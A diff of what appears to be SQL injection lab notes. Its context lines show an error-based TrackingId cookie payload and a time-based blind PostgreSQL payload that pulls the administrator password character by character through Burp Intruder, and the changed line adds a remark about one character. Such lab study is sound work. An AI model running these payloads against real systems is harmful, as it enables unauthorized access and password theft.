@@ -318,7 +318,7 @@ Cookie: TrackingId='+AND+1%3dCAST((SELECT+password+from+users+LIMIT+1)+as+int)--
 ' || (select case when (username='administrator' and substring(password,$1$,1)='$a$') then pg_sleep(5) else pg_sleep(-1) end from users)-- # It will check the 20 character entire password in between $ signs, Reduced sleep to 5 
 ```
 - Password finds below formart, here example password this case ```xtoy3o7zaqn9bvzqyolc```
-    - Payload 1 show password character length number 
+    - Payload 1 show password character length number (Observe 19 charater is 'l' character)
     - Payload 2 show actual password of password character length number from payload
 
 ![BurpSuite Intruder Password](Images/Burp_Intruder_password.png)
